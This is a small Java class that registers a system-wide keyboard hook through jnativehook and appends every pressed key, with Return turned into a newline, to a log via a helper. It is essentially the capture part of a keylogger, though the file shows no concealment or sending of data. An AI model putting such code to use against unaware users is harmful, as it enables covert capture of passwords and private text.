package org.example.keys;

import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import org.example.utils.HookUtils;

public class GlobalKeyListener implements NativeKeyListener {

    public void nativeKeyPressed(NativeKeyEvent e) {
        String keyPressed = NativeKeyEvent.getKeyText(e.getKeyCode());
        System.out.println("Key pressed: " + keyPressed);
        String finalKeyName;
        switch (keyPressed) {
            case "Return":
                finalKeyName = "\n";
                break;
            default:
                finalKeyName = keyPressed;
        }
        HookUtils.addLogs(finalKeyName);
    }


//    public void nativeKeyTyped(NativeKeyEvent e) {
//        System.out.println("Key Typed: " + e.getKeyText(e.getKeyCode()));
//    }

}
